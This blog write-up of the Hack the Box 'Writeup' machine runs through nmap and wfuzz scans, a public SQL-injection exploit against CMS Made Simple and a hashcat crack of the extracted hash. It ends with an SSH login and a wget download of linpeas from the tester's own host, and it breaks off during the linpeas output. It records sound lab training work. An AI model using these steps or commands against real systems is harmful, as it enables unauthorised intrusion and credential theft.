---
layout: post
layout: default
title: "Writeup"
description: "My writeup for the HacktheBox Writeup machine. This was a really fun box that used a CMS vulnerability to grab a user password, and a MOTD exploit for root."
category_string: "Hack the Box (HTB)"
custom_css: ['blogs']
---

# Hack the Box - Writeup

# Contents
- [Overview](#overview)
  - [Ratings](#ratings)
  - [Tags](#tags)
- [Enumeration](#enumeration)
  - [Autorecon](#autorecon)
  - [nmap](#nmap)
- [Website](#website)
  - [Manual Fuzzing](#manual-fuzzing)
  - [Trying LFI](#trying-lfi)
  - [CMS Made Simple Exploit](#cms-made-simple-exploit)
- [Shell as jkr](#shell-as-jkr)
  - [Linpeas](#linpeas)
    - [Highlights](#highlights)
  - [Exploiting cron](#exploiting-cron)
    - [Hijacking run-parts](#hijacking-run-parts)
    - [Getting a Shell](#getting-a-shell)
- [Key Lessons](#key-lessons)

# Overview

This was the second box I did from the Hack the Box Take it Easy Dare Challenge.

**Box Details**

|IP|OS|User-Rated Difficulty|Date Started|Date Completed|
|---|---|---|---|---|
|10.10.10.138|Linux|4.4|2021-07-15|2021-07-15|

This box started with a bit of digging around a blog for something exploitable - unfortunately there was a WAF (Web Application Firewall) preventing brute forcing and fuzzing, so it was back to basics. Eventually I found a version number for a CMS which had an SQL Injection vulnerability, allowing us to extract a password hash and log in to the box.

The privesc to root involved exploiting a Message of the Day script that called a binary without an absolute path - the `/usr/local/sbin` directory on the box was writeable, which meant we could hijack the binary by writing a file with the same name at that location on the path.

## Ratings

I rated the user flag a 2 for difficulty. I spent a long time enumerating it, but realistically I would have found it much easier if I'd paid a bit more attention to the source code. Once I spotted the framework, I'd shelled it within 20 minutes. The box was made a little harder to fuzz by the WAF, but scanning wasn't actually necessary for the user flag.

Root was slightly trickier, and involved a bit of SUID trickery to get a shell. It was also a little tricky to find the target binary and the right syntax, but the exploit concept wasn't too hard. It took 45 minutes to read the flag itself, then another 10-15 minutes to figure out how to get a root shell.

## Tags

#linux #no-metasploit #web #cve #cron #pspy #motd #takeiteasy 

# Enumeration

## Autorecon

I started off with autorecon

```bash
┌──(mac㉿kali)-[~/.config/AutoRecon]
└─$ autorecon 10.10.10.138
[*] Scanning target 10.10.10.138
[*] Running service detection nmap-full-tcp on 10.10.10.138
[*] Running service detection nmap-top-20-udp on 10.10.10.138
[*] Running service detection nmap-quick on 10.10.10.138
[!] Service detection nmap-top-20-udp on 10.10.10.138 returned non-zero exit code: 1
[*] Service detection nmap-quick on 10.10.10.138 finished successfully in 25 seconds
[*] Found ssh on tcp/22 on target 10.10.10.138
[*] Found http on tcp/80 on target 10.10.10.138
[*] Running task tcp/22/sslscan on 10.10.10.138
[*] Running task tcp/22/nmap-ssh on 10.10.10.138
[*] Running task tcp/80/sslscan on 10.10.10.138
[*] Running task tcp/80/nmap-http on 10.10.10.138
[*] Running task tcp/80/curl-index on 10.10.10.138
[*] Running task tcp/80/curl-robots on 10.10.10.138
[*] Running task tcp/80/wkhtmltoimage on 10.10.10.138
[*] Running task tcp/80/whatweb on 10.10.10.138
[*] Running task tcp/80/nikto on 10.10.10.138
[*] Task tcp/22/sslscan on 10.10.10.138 finished successfully in 1 second
[*] Running task tcp/80/gobuster on 10.10.10.138
[*] Task tcp/80/sslscan on 10.10.10.138 finished successfully in 1 second
[!] Task tcp/80/gobuster on 10.10.10.138 returned non-zero exit code: 1
[*] Task tcp/80/curl-index on 10.10.10.138 finished successfully in 4 seconds
[*] Task tcp/80/curl-robots on 10.10.10.138 finished successfully in 7 seconds
[*] Task tcp/22/nmap-ssh on 10.10.10.138 finished successfully in 14 seconds
[*] Task tcp/80/nikto on 10.10.10.138 finished successfully in 16 seconds
[*] Task tcp/80/nmap-http on 10.10.10.138 finished successfully in 16 seconds
[!] Task tcp/80/wkhtmltoimage on 10.10.10.138 returned non-zero exit code: 1
[*] [20:18:15] - There are 2 tasks still running on 10.10.10.138
[*] Task tcp/80/whatweb on 10.10.10.138 finished successfully in 36 seconds
[*] [20:19:15] - There is 1 task still running on 10.10.10.138
[*] Service detection nmap-full-tcp on 10.10.10.138 finished successfully in 2 minutes, 51 seconds
[*] Found tcpwrapped on tcp/80 on target 10.10.10.138
[*] Running task tcp/80/sslscan on 10.10.10.138
[*] Task tcp/80/sslscan on 10.10.10.138 finished successfully in less than a second
[*] Finished scanning target 10.10.10.138 in 2 minutes, 52 seconds
[*] Finished scanning all targets in 2 minutes, 52 seconds!
```

It immediately found a webserver and SSH.

## nmap

I checked out the nmap output from autorecon:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup/results/10.10.10.138/scans]
└─$ cat _full_tcp_nmap.txt 
# Nmap 7.91 scan initiated Thu Jul 15 20:17:16 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/mac/.config/AutoRecon/results/10.10.10.138/scans/_full_tcp_nmap.txt -oX /home/mac/.config/AutoRecon/results/10.10.10.138/scans/xml/_full_tcp_nmap.xml 10.10.10.138
Nmap scan report for 10.10.10.138
Host is up, received user-set (0.016s latency).
Scanned at 2021-07-15 20:17:19 BST for 164s
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT   STATE SERVICE    REASON  VERSION
22/tcp open  ssh        syn-ack OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKBbBK0GkiCbxmAbaYsF4DjDQ3JqErzEazl3v8OndVhynlxNA5sMnQmyH+7ZPdDx9IxvWFWkdvPDJC0rUj1CzOTOEjN61Qd7uQbo5x4rJd3PAgqU21H9NyuXt+T1S/Ud77xKei7fXt5kk1aL0/mqj8wTk6HDp0ZWrGBPCxcOxfE7NBcY3W++IIArn6irQUom0/AAtR3BseOf/VTdDWOXk/Ut3rrda4VMBpRcmTthjsTXAvKvPJcaWJATtRE2NmFjBWixzhQU+s30jPABHcVtxl/Fegr3mvS7O3MpPzoMBZP6Gw8d/bVabaCQ1JcEDwSBc9DaLm4cIhuW37dQDgqT1V
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPzrVwOU0bohC3eXLnH0Sn4f7UAwDy7jx4pS39wtkKMF5j9yKKfjiO+5YTU//inmSjlTgXBYNvaC3xfOM/Mb9RM=
|   256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEuLLsM8u34m/7Hzh+yjYk4pu3WHsLOrPU2VeLn22UkO
80/tcp open  tcpwrapped syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 15 20:20:04 2021 -- 1 IP address (1 host up) scanned in 168.95 seconds

```

It found two ports:
- SSH running on port 22 - this reveals the box to be a Debian machine
- Port 80 is open, but `tcpwrapped` suggests it's behind some form of firewall

There wasn't very much information, so I checked the specific port 80 scan:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup/results/10.10.10.138/scans]
└─$ cat tcp_80_http_nmap.txt 
# Nmap 7.91 scan initiated Thu Jul 15 20:17:44 2021 as: nmap -vv --reason -Pn -sV -p 80 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oN /home/mac/.config/AutoRecon/results/10.10.10.138/scans/tcp_80_http_nmap.txt -oX /home/mac/.config/AutoRecon/results/10.10.10.138/scans/xml/tcp_80_http_nmap.xml 10.10.10.138
Nmap scan report for 10.10.10.138
Host is up, received user-set (0.021s latency).
Scanned at 2021-07-15 20:17:55 BST for 0s

PORT   STATE  SERVICE REASON       VERSION
80/tcp closed http    conn-refused

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 15 20:17:56 2021 -- 1 IP address (1 host up) scanned in 12.58 seconds
```

Maybe it isn't autorecon's fault - the connection is refused, but I can reach [the site](#website) in browser, so perhaps it is rejecting the packets because of the nmap user agent.

I tried again later, after finding out about the Web Application Firewall on the box:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ nmap -p 80 -sC -sV 10.10.10.138
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-15 20:47 BST
Nmap scan report for writeup.htb (10.10.10.138)
Host is up (0.060s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-title: Nothing here yet.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
```

This revealed `robots.txt` and the writeup directory, by which point i'd already found.

# Website

Nmap found port 80, so I visited the site:

![](/assets/images/blogs/Pasted image 20210715202006.png)

It didn't seem to load. I added `http://` in the browser URL bar and it loaded:

![](/assets/images/blogs/Pasted image 20210715202129.png)

The site seems to be a blog. It mentions already being under attack, and also mentions a domain name (`writeup.htb`). I added this to `/etc/hosts`.

Gobuster failed on my [autorecon](#autorecon) scan - normally I would rerun it manually, but I didn't want to trigger any sort of firewall so I did some manual poking around first.

## Manual Fuzzing

There's nothing interesting in the source, including any links.

I tried `/blog`, `/writeups`, and `/blog/` and `/writeups/` to no avail. There was nothing different on the `http://writeup.htb` page either (sometimes loading the site via its virtual host name gives a different result, but not this time).

When I went to visit `/writeups/` on the domain, I mistyped it and accidentally found the `/writeup/` page:

![](/assets/images/blogs/Pasted image 20210715202930.png)

The page source shows the site runs PHP, and a `?page=` parameter which can be fuzzed for LFI:

![](/assets/images/blogs/Pasted image 20210715203034.png)

The writeups are amusing, but there's no useful info on them:

![](/assets/images/blogs/Pasted image 20210715203120.png)

I tried looking for a few other useful files, like `.git`:

![](/assets/images/blogs/Pasted image 20210715203759.png)

The box mentions vi, so maybe there are swp files:

![](/assets/images/blogs/Pasted image 20210715203837.png)

I checked the robots file, which showed us the `/writeup/` directory:

![](/assets/images/blogs/Pasted image 20210715204300.png)

And I tried to provoke a couple of SQLI errors in the `?page` parameter:

![](/assets/images/blogs/Pasted image 20210715204447.png)

But I didn't have any luck - as this is an easy box, and SQLMap would likely trigger a firewall, I moved on.

I checked what's in the normal wordlists:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup/results/10.10.10.138/scans]
└─$ head -100 /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 
```

And tried a few other pages from the list, such as `/admin`:

![](/assets/images/blogs/Pasted image 20210715205242.png)

`/admin` asks for creds - I tried `admin`:`admin`, `jkr`:`password`, `jkr`:`admin`, and `jkr`:`writeup`, but none of them worked.

I wondered if `/archive` had anything in it, but it was empty:

![](/assets/images/blogs/Pasted image 20210715205357.png)

None of this manual fuzzing found anything interesting, so I went to try some LFI in the `?page` parameter.

## Trying LFI

I tried some basic LFI first:

![](/assets/images/blogs/Pasted image 20210715203218.png)

I tried a large number of LFIs manually, before switching to `wfuzz`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup/results/10.10.10.138/scans]
└─$ wfuzz -u http://writeup.htb/writeups/index.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://writeup.htb/writeups/index.php?page=FUZZ
Total requests: 257

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                 
=====================================================================

000000001:   404        9 L      32 W       293 Ch      "/etc/passwd"                                                                                                                           
000000003:   404        9 L      32 W       293 Ch      "/etc/aliases"                                                                                                                          
000000010:   404        9 L      32 W       293 Ch      "/etc/bootptab"                                                                                                                         
...[snip]...                                                                                     
000000240:   404        9 L      32 W       293 Ch      "~/.logout"                                                                                                                             
000000005:   404        9 L      32 W       293 Ch      "/etc/apache2/apache2.conf"                                                                                                             
000000002:   404        9 L      32 W       293 Ch      "/etc/shadow"                                                                                                                           

Total time: 0
Processed Requests: 238
Filtered Requests: 0
Requests/sec.: 0

 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 7: Failed to connect to writeup.htb port 80: Connection refused
```

As expected, this eventually got me blocked.

While I waited, I used `curl` to see if there was a timeout limit specified in the header:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup/results/10.10.10.138/scans]
└─$ curl -I writeup.htb
HTTP/1.1 200 OK
Date: Thu, 15 Jul 2021 19:44:32 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Wed, 24 Apr 2019 20:15:00 GMT
ETag: "bd8-5874c5b2a3bbb"
Accept-Ranges: bytes
Content-Length: 3032
Vary: Accept-Encoding
Content-Type: text/html
```

It seemed I'd been unbanned, so it only lasted a couple of minutes. Good to know.

Next I checked if we could grab the index page via the `?page` parameter:

![](/assets/images/blogs/Pasted image 20210715203948.png)

![](/assets/images/blogs/Pasted image 20210715204001.png)

Neither of these worked, so I was pretty confident at this point that LFI wouldn't work.

I tried `wfuzz` one more time, with a delay to try and bypass the WAF:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup/results/10.10.10.138/scans]
└─$ wfuzz -u http://writeup.htb/writeups/index.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -s 1
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://writeup.htb/writeups/index.php?page=FUZZ
Total requests: 257

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                 
=====================================================================

000000001:   404        9 L      32 W       293 Ch      "/etc/passwd"                                                                                                                       ...[snip]...    

000000029:   404        9 L      32 W       293 Ch      "/etc/httpd/httpd.conf"                                                                                                                 

Total time: 0
Processed Requests: 29
Filtered Requests: 0
Requests/sec.: 0

 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 7: Failed to connect to writeup.htb port 80: Connection refused
```

I got blocked again after 30 requests.

## CMS Made Simple Exploit

After about 45 minutes and a little nudge, I re-checked the source and found areference to a CMS:

```html
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
```

I looked for this in `searchsploit`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ searchsploit "cms made simple"
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                                                                     | php/remote/46627.rb
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                                                                                                | php/webapps/26298.txt
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                                                                                                | php/webapps/26217.html
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                                                                                                             | php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                                                                                 | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                                                                                      | php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                                                                                                            | php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                                                                   | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                                                                                       | php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                                                                                                           | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                                                                                                          | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                                                                                    | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                                                                                       | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                                                                                                                       | php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                                                                                                          | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                                                                                                | php/webapps/34068.html
CMS Made Simple 2.1.6 - 'cntnt01detailtemplate' Server-Side Template Injection                                                                                         | php/webapps/48944.py
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                                                                                       | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                                                                                                          | php/webapps/44192.txt
CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                                                                                         | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                                                                                           | php/webapps/48742.txt
CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                                                                                               | php/webapps/48851.txt
CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)                                                                                                            | php/webapps/49793.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)                                                                                                                           | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)                                                                               | php/webapps/49199.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                                                                          | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                                                                          | php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                                                                                                        | php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                               | php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                                                                                       | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                                                                                  | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                                                                         | php/webapps/46546.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

A few of the exploits are authenticated. One is an RCE, but reading the code shows it requires a fresh install. The next best option is the SQL injection.

The exploit, at `php/webapps/46635.py`, seems to do a blind injection via a time based attack. I'll clone it and run it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ searchsploit -m php/webapps/46635.py
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ python2 -m pip install termcolor
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ python2 46635.py -u http://writeup.htb/writeup/
```

It finds us a password hash and salt within a minute!

```
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

I'll try to find the hash format:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ hashcat --example-hashes | grep simple
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ hashcat --example-hashes | grep cms
```

Old reliable `hashid` ended up giving us an answer:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ hashid 62def4866937f08cc13bab43bb14e6f7
Analyzing '62def4866937f08cc13bab43bb14e6f7'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
```

The `crack_password()` method in the exploit code also tells us it's MD5:

```python
def crack_password():
    global password
    global output
    global wordlist
    global salt
    dict = open(wordlist)
    for line in dict.readlines():
        line = line.replace("\n", "")
        beautify_print_try(line)
        if hashlib.md5(str(salt) + line).hexdigest() == password:
            output += "\n[+] Password cracked: " + line
            break
    dict.close()
```

So we can look for md5 in `hashcat`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ hashcat --example-hashes | grep md5 -B 1

...[snip]...

MODE: 20
TYPE: md5($salt.$pass)

...[snip]...

```

I added hash:salt to a file:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ echo -n '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > hash
```

And cracked it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ hashcat -a 0 -m 20 hash --wordlist /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

...[snip]...

62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5($salt.$pass)
Hash.Target......: 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807
Time.Started.....: Thu Jul 15 21:25:19 2021 (4 secs)
Time.Estimated...: Thu Jul 15 21:25:23 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2094.9 kH/s (0.27ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4360192/14344385 (30.40%)
Rejected.........: 0/4360192 (0.00%)
Restore.Point....: 4359168/14344385 (30.39%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: raymie0506 -> raygan96

Started: Thu Jul 15 21:24:30 2021
Stopped: Thu Jul 15 21:25:24 2021
```

I immediately checked for password reuse and logged in via SSH:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/writeup]
└─$ ssh jkr@10.10.10.138
The authenticity of host '10.10.10.138 (10.10.10.138)' can't be established.
ECDSA key fingerprint is SHA256:TEw8ogmentaVUz08dLoHLKmD7USL1uIqidsdoX77oy0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.138' (ECDSA) to the list of known hosts.
jkr@10.10.10.138's password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
```

It worked! We can now grab the user flag:

![](/assets/images/blogs/Pasted image 20210715212801.png)

We can also presumably log in to the admin panel - however, I tried `jkr`:`raykayjay9` and `jkr@writeup.htb`:`raykayjay9` but neither worked.

# Shell as jkr

I did some initial manual enumeration, checking for `sudo` capabilities, interesting running processes, and cron jobs:

```bash
jkr@writeup:~$ sudo -l
-bash: sudo: command not found
jkr@writeup:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1  15796  1808 ?        Ss   15:09   0:00 init [2]
...[snip]...
root      1310  0.0  0.2 250108  2372 ?        Ssl  15:09   0:00 /usr/sbin/rsyslogd
root      1452  0.0  1.0 163432 10740 ?        Sl   15:09   0:03 /usr/sbin/vmtoolsd
root      1487  0.0  1.0  66316 10420 ?        S    15:09   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
root      1570  0.0  2.8 330848 29260 ?        Ss   15:09   0:00 /usr/sbin/apache2 -k start
root      1630  0.0  0.2  29664  2516 ?        Ss   15:09   0:00 /usr/sbin/cron
message+  1646  0.0  0.2  32744  2480 ?        Ss   15:09   0:00 /usr/bin/dbus-daemon --system
root      1686  0.0  0.2  28528  2992 ?        S    15:09   0:00 /usr/sbin/elogind -D
root      1757  0.0  0.2   9776  2824 ?        S    15:09   0:00 /bin/bash /usr/bin/mysqld_safe
root      1781  0.0  1.5 431436 16000 ?        Sl   15:09   0:02 /usr/bin/python3 /usr/bin/fail2ban-server -s /var/run/fail2ban/fail2ban.sock -p /var/run/fail2ban/fail2ban.pid -b
mysql     1934  0.0  7.8 654008 80284 ?        Sl   15:09   0:03 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb18/plugin --user=mysql --skip-log
root      1935  0.0  0.0   4192   708 ?        S    15:09   0:00 logger -t mysqld -p daemon error
root      1978  0.0  0.3  69952  3856 ?        Ss   15:09   0:00 /usr/sbin/sshd
root      2047  0.0  0.1  14520  1708 tty1     Ss+  15:09   0:00 /sbin/getty 38400 tty1
root      2048  0.0  0.1  14520  1696 tty2     Ss+  15:09   0:00 /sbin/getty 38400 tty2
root      2049  0.0  0.1  14520  1872 tty3     Ss+  15:09   0:00 /sbin/getty 38400 tty3
root      2050  0.0  0.1  14520  1776 tty4     Ss+  15:09   0:00 /sbin/getty 38400 tty4
root      2051  0.0  0.1  14520  1872 tty5     Ss+  15:09   0:00 /sbin/getty 38400 tty5
root      2052  0.0  0.1  14520  1708 tty6     Ss+  15:09   0:00 /sbin/getty 38400 tty6
root      2148  0.0  0.0      0     0 ?        S    15:10   0:00 [kauditd]
www-data  2581  0.0  0.8 330872  8680 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
www-data  2582  0.0  0.8 330872  8680 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
www-data  2583  0.0  0.8 330872  8680 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
www-data  2584  0.0  0.8 330872  8680 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
www-data  2585  0.0  0.8 330872  8680 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
www-data  2586  0.0  0.8 330872  8680 ?        S    16:20   0:00 /usr/sbin/apache2 -k start
root      2609  0.0  0.0      0     0 ?        S    16:27   0:00 [kworker/0:1]
root      2625  0.0  0.0      0     0 ?        S    16:32   0:00 [kworker/0:0]
root      2629  0.0  0.7 108796  7292 ?        Ss   16:33   0:00 sshd: jkr [priv]
jkr       2635  0.0  0.3 108796  3988 ?        S    16:33   0:00 sshd: jkr@pts/0
jkr       2636  0.0  0.3  19884  3768 pts/0    Ss   16:33   0:00 -bash
jkr       2653  0.0  0.2  19188  2484 pts/0    R+   16:36   0:00 ps aux
jkr@writeup:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && /bin/run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && /bin/run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && /bin/run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && /bin/run-parts --report /etc/cron.monthly )
```

There were a few root processes, including `cron`, but no jobs specified.

## Linpeas

I switched to Linpeas:

```bash
jkr@writeup:/tmp$ cd /tmp && wget http://10.10.16.211:8000/linpeas.sh
--2021-07-15 16:39:22--  http://10.10.16.211:8000/linpeas.sh
Connecting to 10.10.16.211:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 325084 (317K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                         100%[=============================================================================================================>] 317.46K  1.29MB/s    in 0.2s    

2021-07-15 16:39:23 (1.29 MB/s) - ‘linpeas.sh’ saved [325084/325084]

jkr@writeup:/tmp$ chmod +x linpeas.sh 
jkr@writeup:/tmp$ ./linpeas.sh 
```

### Highlights

```
[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
-rw-r--r-- 1 root root  742 Oct  7  2017 /etc/crontab

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Apr 19  2019 .
drwxr-xr-x 81 root root 4096 Aug 23  2019 ..
-rw-r--r--  1 root root  702 Apr 19  2019 php
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

/etc/cron.daily:
total 36
drwxr-xr-x  2 root root 4096 Apr 19  2019 .
drwxr-xr-x 81 root root 4096 Aug 23  2019 ..
-rwxr-xr-x  1 root root  539 Nov  3  2018 apache2
-rwxr-xr-x  1 root root 1474 Sep 13  2017 apt-compat
-rwxr-xr-x  1 root root  355 Oct 25  2016 bsdmainutils
-rwxr-xr-x  1 root root 1597 Feb 22  2017 dpkg
-rwxr-xr-x  1 root root   89 May  5  2015 logrotate
-rwxr-xr-x  1 root root  249 May 17  2017 passwd
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Apr 19  2019 .
drwxr-xr-x 81 root root 4096 Aug 23  2019 ..
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Apr 19  2019 .
drwxr-xr-x 81 root root 4096 Aug 23  2019 ..
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

/etc/cron.weekly:
total 12
drwxr-xr-x  2 root root 4096 Apr 19  2019 .
drwxr-xr-x 81 root root 4096 Aug 23  2019 ..
